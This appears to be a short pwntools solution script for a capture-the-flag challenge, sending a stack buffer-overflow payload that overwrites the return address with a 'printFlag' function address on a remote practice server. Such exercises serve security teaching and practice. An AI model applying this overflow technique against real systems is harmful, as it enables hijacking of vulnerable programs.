from pwn import *

elf = ELF('./bbys_tu_2016')

r = remote('node3.buuoj.cn', 27039)

r.sendline(b'a' * 0x18 + p32(elf.sym['printFlag']))
r.recvline()
r.recvline()
flag = str(r.recvline(False)).strip("b'")
print(flag)